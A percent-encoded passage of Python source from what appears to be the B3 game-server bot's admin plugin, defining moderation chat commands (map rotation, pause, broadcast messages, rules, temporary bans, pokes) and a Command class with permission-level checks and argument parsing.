%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20message%20%3D%20'%5E7%25s%20%5E7has%20no%20active%20warnings'%20%25%20sclient.exactName%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20message)%0A%0A%20%20%20%20def%20cmd_maps(self%2C%20data%2C%20client%3DNone%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20-%20list%20the%20server's%20map%20rotation%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20if%20not%20self.aquireCmdLock(cmd%2C%20client%2C%2060%2C%20True)%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message('%5E7Do%20not%20spam%20commands')%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20maps%20%3D%20self.console.getMaps()%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20maps%20is%20None%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message('%5E7ERROR%3A%20could%20not%20get%20map%20list')%0A%20%20%20%20%20%20%20%20%20%20%20%20elif%20len(maps)%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20'%5E7Map%20Rotation%3A%20%5E2%25s'%20%25%20'%5E7%2C%20%5E2'.join(maps))%0A%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20'%5E7Map%20Rotation%20list%20is%20empty')%0A%0A%20%20%20%20def%20cmd_nextmap(self%2C%20data%2C%20client%3DNone%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20-%20list%20the%20next%20map%20in%20rotation%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20if%20not%20self.aquireCmdLock(cmd%2C%20client%2C%2060%2C%20True)%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message('%5E7Do%20not%20spam%20commands')%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20mapname%20%3D%20self.console.getNextMap()%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20mapname%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20'%5E7Next%20Map%3A%20%5E2%25s'%20%25%20mapname)%0A%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message('%5E7ERROR%3A%20could%20not%20get%20nextmap')%0A%0A%20%20%20%20def%20cmd_pause(self%2C%20data%2C%20client%3DNone%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20%3Cduration%3E%20-%20pause%20the%20bot%20from%20parsing%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20m%20%3D%20re.match('%5E(%5B0-9%5D%2B%5Ba-z%5D*)%24'%2C%20data)%0A%20%20%20%20%20%20%20%20if%20not%20m%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('invalid_parameters'))%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20duration%20%3D%20functions.time2minutes(data)%0A%20%20%20%20%20%20%20%20%20%20%20%20self.console.say('%5E7Sleeping%20for%20%25s'%20%25%20functions.minutesStr(duration))%0A%20%20%20%20%20%20%20%20%20%20%20%20unpause_task%20%3D%20threading.Timer(duration%20*%2060%2C%20self.console.unpause)%0A%20%20%20%20%20%20%20%20%20%20%20%20unpause_task.daemon%20%3D%20True%20%23%20won't%20block%20the%20bot%20in%20case%20of%20shutdown%0A%20%20%20%20%20%20%20%20%20%20%20%20self.console.pause()%0A%20%20%20%20%20%20%20%20%20%20%20%20unpause_task.start()%0A%0A%20%20%20%20def%20cmd_spam(self%2C%20data%2C%20client%3DNone%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20%5Bplayer%5D%20%3Cmessage%3E%20-%20spam%20a%20predefined%20message%20to%20all%20players%20or%20a%20given%20player%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20m%20%3D%20re.match('%5E((%3FP%3Cplayer%3E%5Cw%2B)%5Cs%2B)%3F(%3FP%3Ckeyword%3E%5Cw%7B2%2C%7D)%24'%2C%20data)%0A%20%20%20%20%20%20%20%20if%20not%20m%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('invalid_parameters'))%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20keyword%20%3D%20m.group(%22keyword%22)%0A%20%20%20%20%20%20%20%20%20%20%20%20msg%20%3D%20self.getSpam(keyword)%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20not%20msg%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message('%5E7Could%20not%20find%20spam%20message%20%5E1%25s'%20%25%20keyword)%0A%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20player_name%20%3D%20m.group(%22player%22)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20not%20player_name%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20cmd%20and%20cmd.big%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.saybig(msg)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.say(msg)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sclient%20%3D%20self.findClientPrompt(player_name%2C%20client)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20sclient%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sclient.message(msg)%0A%0A%20%20%20%20def%20cmd_rules(self%2C%20data%2C%20client%3DNone%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20-%20say%20the%20rules%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20if%20not%20self.aquireCmdLock(cmd%2C%20client%2C%2060%2C%20True)%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message('%5E7Do%20not%20spam%20commands')%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20m%20%3D%20self.parseUserCmd(data)%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20m%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20client.maxLevel%20%3E%3D%20self._admins_level%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sclient%20%3D%20self.findClientPrompt(m%5B0%5D%2C%20client)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20sclient%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20sclient.maxLevel%20%3E%3D%20client.maxLevel%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message('%25s%20%5E7already%20knows%20the%20rules'%20%25%20sclient.exactName)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message('%5E7Sir%2C%20Yes%20Sir!%2C%20spamming%20rules%20to%20%25s'%20%25%20sclient.exactName)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message('%5E7Stop%20trying%20to%20spam%20other%20players')%0A%20%20%20%20%20%20%20%20%20%20%20%20elif%20cmd.loud%20or%20cmd.big%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20thread.start_new_thread(self._sendRules%2C%20()%2C%20%7B'sclient'%3A%20None%2C%20'big'%3A%20cmd.big%7D)%0A%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sclient%20%3D%20client%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20thread.start_new_thread(self._sendRules%2C%20()%2C%20%7B'sclient'%3A%20sclient%7D)%0A%0A%20%20%20%20def%20cmd_spams(self%2C%20data%2C%20client%3DNone%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20-%20list%20spam%20messages%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20ws%20%3D%20sorted(self.config.options('spamages'))%0A%20%20%20%20%20%20%20%20if%20len(ws)%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message('%5E7Spamages%3A%20%25s'%20%25%20'%2C%20'.join(ws))%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message('%5E7No%20spamage%20message%20defined')%0A%09%09%09%0A%20%20%20%20def%20cmd_tempban(self%2C%20data%2C%20client%3DNone%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20%3Cname%3E%20%3Cduration%3E%20%5B%3Creason%3E%5D%20-%20temporarily%20ban%20a%20player%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20m%20%3D%20self.parseUserCmd(data)%0A%0A%20%20%20%20%20%20%20%20if%20not%20m%20or%20not%20m%5B1%5D%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('invalid_parameters'))%0A%20%20%20%20%20%20%20%20%20%20%20%20return%0A%0A%20%20%20%20%20%20%20%20cid%20%3D%20m%5B0%5D%0A%20%20%20%20%20%20%20%20m%20%3D%20re.match('%5E(%5B0-9%5D%2B%5Bdwhsmy%5D*)(%3F%3A%5Cs(.%2B))%3F%24'%2C%20m%5B1%5D%2C%20re.I)%0A%20%20%20%20%20%20%20%20if%20not%20m%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('invalid_parameters'))%0A%20%20%20%20%20%20%20%20%20%20%20%20return%0A%0A%20%20%20%20%20%20%20%20duration%2C%20keyword%20%3D%20m.groups()%0A%20%20%20%20%20%20%20%20duration%20%3D%20functions.time2minutes(duration)%0A%0A%20%20%20%20%20%20%20%20if%20client.maxLevel%20%3C%20self._long_tempban_level%20and%20duration%20%3E%20self._long_tempban_max_duration%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%23%20temp%20ban%20for%20maximum%20specified%20in%20settings%0A%20%20%20%20%20%20%20%20%20%20%20%20duration%20%3D%20self._long_tempban_max_duration%0A%0A%20%20%20%20%20%20%20%20if%20duration%20%3E%2043200%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20duration%20%3D%2043200%0A%0A%20%20%20%20%20%20%20%20reason%20%3D%20self.getReason(keyword)%0A%0A%20%20%20%20%20%20%20%20if%20not%20reason%20and%20client.maxLevel%20%3C%20self._noreason_level%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('error_no_reason'))%0A%20%20%20%20%20%20%20%20%20%20%20%20return%0A%20%20%20%20%20%20%20%20elif%20not%20duration%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message('%5E7You%20must%20supply%20a%20duration%20for%20this%20ban')%0A%20%20%20%20%20%20%20%20%20%20%20%20return%0A%0A%20%20%20%20%20%20%20%20sclient%20%3D%20self.findClientPrompt(cid%2C%20client)%0A%20%20%20%20%20%20%20%20if%20sclient%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20sclient.cid%20%3D%3D%20client.cid%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.say(self.getMessage('temp_ban_self'%2C%20client.exactName))%0A%20%20%20%20%20%20%20%20%20%20%20%20elif%20sclient.maxLevel%20%3E%3D%20client.maxLevel%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20sclient.maskGroup%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('action_denied_masked'%2C%20%7B'name'%3A%20sclient.exactName%7D))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.say(self.getMessage('temp_ban_denied'%2C%20client.exactName%2C%20sclient.exactName))%0A%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sclient.tempban(reason%2C%20keyword%2C%20duration%2C%20client)%0A%20%20%20%20%20%20%20%20elif%20re.match('%5E%5B0-9%5D%2B%24'%2C%20cid)%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%23%20failsafe%2C%20do%20a%20manual%20client%20id%20ban%0A%20%20%20%20%20%20%20%20%20%20%20%20self.console.tempban(cid%2C%20reason%2C%20duration%2C%20client)%0A%0A%20%20%20%20def%20cmd_poke(self%2C%20data%2C%20client%3DNone%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20%3Cplayer%3E%20-%20notify%20a%20player%20that%20he%20needs%20to%20move%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20m%20%3D%20self.parseUserCmd(data)%0A%20%20%20%20%20%20%20%20if%20not%20m%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('invalid_parameters'))%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20m%5B0%5D%20%3D%3D%20'b3'%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.warnClient(client%2C%20'Do%20not%20poke%20b3!'%2C%20None%2C%20False%2C%20''%2C%201)%0A%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sclient%20%3D%20self.findClientPrompt(m%5B0%5D%2C%20client)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20sclient%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20message%20%3D%20random.choice(('Wake%20up!'%2C%20'*poke*'%2C%20'Attention!'%2C%20'Get%20up!'%2C%20'Go%20go%20go!'%2C%20'Move%20out!'%2C%20'On%20your%20feet!'))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.say('%5E7%25s%20%25s%5E7!'%20%25%20(message%2C%20sclient.exactName))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.write('screentell%20%25s%20%25s'%20%25%20(sclient.cid%2C%20message))%0A%0A%0Aclass%20Command(object)%3A%0A%0A%20%20%20%20command%20%3D%20''%0A%20%20%20%20alias%20%3D%20''%0A%20%20%20%20help%20%3D%20''%0A%20%20%20%20level%20%3D%200%0A%20%20%20%20secretLevel%20%3D%200%0A%20%20%20%20time%20%3D%200%0A%20%20%20%20func%20%3D%20None%0A%20%20%20%20plugin%20%3D%20None%0A%20%20%20%20prefix%20%3D%20'!'%0A%20%20%20%20prefixLoud%20%3D%20'%40'%0A%20%20%20%20prefixBig%20%3D%20'%26'%0A%0A%20%20%20%20PLAYER_DATA%20%3D%20re.compile(r'%5E(%5B%5Cw%5Cd%5Cs-%5D%2B%7C%40%5Cd%2B%7C%5Cd%2B)%24'%2C%20re.I)%0A%20%20%20%20_reType%20%3D%20type(re.compile('.*'))%0A%0A%20%20%20%20def%20__init__(self%2C%20plugin%2C%20cmd%2C%20level%2C%20func%2C%20help%3DNone%2C%20alias%3DNone%2C%20secretLevel%3D100)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20Build%20a%20new%20command%20object.%0A%20%20%20%20%20%20%20%20%3Aparam%20plugin%3A%20The%20plugin%20registering%20the%20command%0A%20%20%20%20%20%20%20%20%3Aparam%20cmd%3A%20The%20command%20name%0A%20%20%20%20%20%20%20%20%3Aparam%20level%3A%20The%20min(-max)%20level%20to%20execute%20the%20command%0A%20%20%20%20%20%20%20%20%3Aparam%20func%3A%20The%20method%20to%20execute%20when%20the%20command%20is%20launched%0A%20%20%20%20%20%20%20%20%3Aparam%20help%3A%20The%20command%20help%20text%0A%20%20%20%20%20%20%20%20%3Aparam%20alias%3A%20The%20command%20alias%0A%20%20%20%20%20%20%20%20%3Aparam%20secretLevel%3A%20The%20command%20secret%20level%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20self.command%20%3D%20cmd.strip()%0A%20%20%20%20%20%20%20%20self.func%20%3D%20func%0A%20%20%20%20%20%20%20%20self.plugin%20%3D%20plugin%0A%20%20%20%20%20%20%20%20self.loud%20%3D%20False%0A%20%20%20%20%20%20%20%20self.big%20%3D%20False%0A%20%20%20%20%20%20%20%20self.private%20%3D%20False%0A%0A%20%20%20%20%20%20%20%20if%20help%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.help%20%3D%20help.strip()%0A%20%20%20%20%20%20%20%20if%20alias%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.alias%20%3D%20alias.strip()%0A%0A%20%20%20%20%20%20%20%20level%20%3D%20str(level)%0A%20%20%20%20%20%20%20%20if%20level.lower()%20%3D%3D%20'none'%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.level%20%3D%20None%0A%20%20%20%20%20%20%20%20elif%20level.count('-')%20%3D%3D%201%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20level%20%3D%20level.split('-'%2C%201)%0A%20%20%20%20%20%20%20%20%20%20%20%20self.level%20%3D%20(int(level%5B0%5D)%2C%20int(level%5B1%5D))%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.level%20%3D%20(int(level)%2C%20100)%0A%0A%20%20%20%20%20%20%20%20if%20secretLevel%20is%20None%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.secretLevel%20%3D%20100%0A%0A%20%20%20%20def%20canUse(self%2C%20client)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20Check%20whether%20a%20client%20can%20use%20such%20command%3A%0A%20%20%20%20%20%20%20%20%3Aparam%20client%3A%20The%20client%20on%20who%20to%20perform%20the%20check%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20if%20self.level%20is%20None%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20False%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20self.level%5B0%5D%20%3C%3D%20int(client.maxLevel)%20%3C%3D%20self.level%5B1%5D%0A%0A%20%20%20%20def%20execute(self%2C%20data%2C%20client)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20Execute%20a%20command.%0A%20%20%20%20%20%20%20%20%3Aparam%20data%3A%20The%20command%20parameters%0A%20%20%20%20%20%20%20%20%3Aparam%20client%3A%20The%20client%20executing%20the%20command%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20self.func(data%2C%20client%2C%20copy.copy(self))%0A%20%20%20%20%20%20%20%20self.time%20%3D%20self.plugin.console.time()%0A%0A%20%20%20%20def%20executeLoud(self%2C%20data%2C%20client)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20Execute%20a%20command%20a%20redirect%20the%20output%20to%20console%20say.%0A%20%20%20%20%20%20%20%20%3Aparam%20data%3A%20The%20command%20parameters%0A%20%20%20%20%20%20%20%20%3Aparam%20client%3A%20The%20client%20executing%20the%20command%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20cmd%20%3D%20copy.copy(self)%0A%20%20%20%20%20%20%20%20cmd.loud%20%3D%20True%0A%20%20%20%20%20%20%20%20self.func(data%2C%20client%2C%20cmd)%0A%20%20%20%20%20%20%20%20self.time%20%3D%20self.plugin.console.time()%0A%0A%20%20%20%20def%20executeBig(self%2C%20data%2C%20client)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20Execute%20a%20command%20and%20redirect%20the%20output%20to%20console%20saybig%0A%20%20%20%20%20%20%20%20%3Aparam%20data%3A%20The%20command%20parameters%0A%20%20%20%20%20%20%20%20%3Aparam%20client%3A%20The%20client%20executing%20the%20command%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20cmd%20%3D%20copy.copy(self)%0A%20%20%20%20%20%20%20%20cmd.big%20%3D%20True%0A%20%20%20%20%20%20%20%20self.func(data%2C%20client%2C%20cmd)%0A%20%20%20%20%20%20%20%20self.time%20%3D%20self.plugin.console.time()%0A%0A%20%20%20%20def%20executePrivate(self%2C%20data%2C%20client)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20Execute%20a%20command%20and%20redirect%20the%20output%20to%20console%20saytell.%0A%20%20%20%20%20%20%20%20%3Aparam%20data%3A%20The%20command%20parameters%0A%20%20%20%20%20%20%20%20%3Aparam%20client%3A%20The%20client%20executing%20the%20command%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20cmd%20%3D%20copy.copy(self)%0A%20%20%20%20%20%20%20%20cmd.private%20%3D%20True%0A%20%20%20%20%20%20%20%20self.func(data%2C%20client%2C%20cmd)%0A%20%20%20%20%20%20%20%20self.time%20%3D%20self.plugin.console.time()%0A%0A%20%20%20%20def%20sayLoudOrPM(self%2C%20client%2C%20message%2C%20*args)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20Display%20a%20message%20with%20visibility%20regulated%20by%20the%20command%20prefix.%0A%20%20%20%20%20%20%20%20%3Aparam%20client%3A%20The%20client%20on%20who%20to%20send%20the%20message%0A%20%20%20%20%20%20%20%20%3Aparam%20message%3A%20The%20message%20to%20be%20sent%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20if%20self.loud%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.plugin.console.say(message%2C%20*args)%0A%20%20%20%20%20%20%20%20elif%20self.big%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.plugin.console.saybig(message%2C%20*args)%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message(message%2C%20*args)%0A%0A%20%20%20%20def%20parseData(self%2C%20data%2C%20*args)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20Parse%20command%20data.%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20splitdata%20%3D%20self.splitData(data)%0A%20%20%20%20%20%20%20%20if%20not%20len(args)%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20splitdata%0A%0A%20%20%20%20%20%20%20%20params%20%3D%20%7B%7D%0A%0A%20%20%20%20%20%20%20%20i%20%3D%200%0A%20%20%20%20%20%20%20%20for%20i%20in%20range(0%2C%20min(len(args)%2C%20len(splitdata)))%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20params%5Bargs%5Bi%5D%5B0%5D%5D%20%3D%20splitdata%5Bi%5D%0A%0A%20%20%20%20%20%20%20%20if%20len(splitdata)%20%3E%20i%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20params%5Bargs%5Bi%5D%5B0%5D%5D%20%3D%20'%20'.join(splitdata%5Bi%3A%5D)%0A%0A%20%20%20%20%20%20%20%20badfield%20%3D%20None%0A%20%20%20%20%20%20%20%20valid%20%3D%20True%0A%20%20%20%20%20%20%20%20for%20a%20in%20args%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20not%20a%5B0%5D%20in%20params.keys()%20or%20len(params%5Ba%5B0%5D%5D)%20%3D%3D%200%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20len(a)%20%3D%3D%203%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%23%20set%20the%20default%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20params%5Ba%5B0%5D%5D%20%3D%20a%5B2%5D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20badfield%20%3D%20a%5B0%5D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20valid%20%3D%20False%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20break%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20len(a)%20%3E%201%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20type(a%5B1%5D)%20%3D%3D%20self._reType%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%23%20see%20if%20it%20matches%20regexp%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20valid%20%3D%20re.match(a%5B1%5D%2C%20params%5Ba%5B0%5D%5D)%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20not%20valid%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20badfield%20%3D%20a%5B0%5D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%23%20see%20if%20it%20can%20be%20converted%20to%20type%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20params%5Ba%5B0%5D%5D%20%3D%20a%5B1%5D(params%5Ba%5B0%5D%5D)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20except%20ValueError%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20badfield%20%3D%20a%5B0%5D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20valid%20%3D%20False%0A%0A%20%20%20%20%20%20%20%20if%20valid%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20params%2C%20None%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20h%20%3D%20%5B'%5E1Input%20Error!%20%5E7Example%3A%20'%5D%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20self.loud%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20h.append('%25s%25s'%20%25%20(self.prefixLoud%2C%20self.command))%0A%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20h.append('%25s%25s'%20%25%20(self.prefix%2C%20self.command))%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20for%20a%20in%20args%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20len(a)%20%3D%3D%203%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%23optional%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20parm%20%3D%20'%5B%25s%5D'%20%25%20a%5B0%5D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20parm%20%3D%20'%3C%25s%3E'%20%25%20a%5B0%5D%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20a%5B0%5D%20%3D%3D%20badfield%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20parm%20%3D%20'%5E1%25s%5E7'%20%25%20parm%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20h.append(parm)%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20None%2C%20'%20'.join(h)%0A%0A%20%20%20%20def%20splitData(self%2C%20data)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20Split%20command%20parameters.%0A%20%20%20%20%20%20%20%20%3Aparam%20data%3A%20The%20parameters%20to%20be%20split%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20params%20%3D%20%5B%5D%0A%20%20%20%20%20%20%20%20buf%20%3D%20''%0A%20%20%20%20%20%20%20%20in_quote%20%3D%20False%0A%20%20%20%20%20%20%20%20in_dquote%20%3D%20False%0A%20%20%20%20%20%20%20%20for%20c%20in%20str(data).strip()%3A%0A%20%20%20%20%2